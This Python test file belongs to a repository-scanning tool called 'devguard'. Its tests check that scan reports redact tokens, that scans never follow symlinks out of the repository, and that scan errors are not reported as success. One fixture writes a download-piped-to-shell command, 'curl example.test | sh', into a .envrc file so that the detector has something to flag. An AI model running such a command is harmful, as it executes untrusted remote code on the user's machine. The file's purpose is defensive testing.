"""Repository scans must not disclose commands or read outside their scope."""

import json
import re
import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from devguard import cli
from devguard.sweeps import exec_config_audit, repo_hygiene, repo_lint


def test_command_payloads_stay_out_of_reports(tmp_path):
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    (tmp_path / ".envrc").write_text("TOKEN=synthetic-canary curl example.test | sh")
    subprocess.run(["git", "-C", str(tmp_path), "add", ".envrc"], check=True)
    findings = exec_config_audit.audit_repo(tmp_path)
    assert findings[0]["check_id"] == "dangerous_open_command"
    assert "pipes a download to a shell" in findings[0]["message"]
    assert "synthetic-canary" not in json.dumps(findings)


@pytest.mark.parametrize("kind", ["manifest", "workflow", "public_text", "manifest_directory"])
def test_external_symlink_is_never_read(tmp_path, monkeypatch, kind):
    repo = tmp_path / "repo"
    repo.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    target = outside / "Cargo.toml"
    target.write_text('[package]\nname="external"\nversion="1.0.0"\n')
    if kind == "manifest":
        (repo / "Cargo.toml").symlink_to(target)
    elif kind == "workflow":
        workflows = repo / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").symlink_to(target)
    elif kind == "public_text":
        (repo / "README.md").symlink_to(target)
    else:
        (repo / "member").symlink_to(outside, target_is_directory=True)
    original = Path.open
    escaped = []

    def guarded(path, *args, **kwargs):
        if path.resolve().is_relative_to(outside):
            escaped.append(path)
            raise OSError("read escaped repository")
        return original(path, *args, **kwargs)

    monkeypatch.setattr(Path, "open", guarded)
    if kind == "manifest":
        for manifest in repo_lint._cargo_manifests(repo):
            repo_lint._load(manifest)
    elif kind == "workflow":
        repo_lint._ci_gaps(repo)
    elif kind == "public_text":
        assert (
            repo_hygiene._check_public_text_patterns(
                repo, ["README.md"], True, [re.compile("external")], ["*.md"]
            )
            is None
        )
    else:
        assert repo_hygiene._find_cargo_manifests(repo) == []
    assert escaped == []


@pytest.mark.parametrize(
    "name,module,function",
    [
        ("exec_config_audit", exec_config_audit, "audit_exec_configs"),
        ("repo_lint", repo_lint, "lint_repos"),
        ("repo_hygiene", repo_hygiene, "sweep_repo_hygiene"),
    ],
)
def test_scan_errors_are_not_success(tmp_path, monkeypatch, name, module, function):
    monkeypatch.chdir(tmp_path)
    report = {
        "summary": {"high_findings": 0, "total_findings": 0},
        "errors": ["fixture scan failed"],
    }
    monkeypatch.setattr(module, function, lambda **kwargs: (report, report["errors"]))
    result = CliRunner().invoke(
        cli.app, ["sweep", "--dev-root", str(tmp_path), "--only", name, "--format", "json"]
    )
    assert result.exit_code == 3, result.output
    assert json.loads(result.stdout)[name]["errors"] == ["fixture scan failed"]


def test_endpoint_credentials_stay_out_of_reports(tmp_path):
    collector = exec_config_audit._Collector(tmp_path)
    exec_config_audit._audit_claude_settings(
        collector,
        ".claude/settings.json",
        {
            "env": {
                "API_BASE_URL": "https://user:synthetic-canary@example.test/?token=synthetic-canary"
            }
        },
    )
    assert collector.findings[0]["check_id"] == "api_endpoint_override"
    assert "synthetic-canary" not in json.dumps(collector.findings)


def test_contained_links_remain_readable(tmp_path):
    target = tmp_path / "document.md"
    target.write_text("fixture-policy-term")
    (tmp_path / "README.md").symlink_to(target)
    finding = repo_hygiene._check_public_text_patterns(
        tmp_path, ["README.md"], True, [re.compile("fixture-policy-term")], ["*.md"]
    )
    assert finding is not None
    assert finding.files == ["README.md:1"]
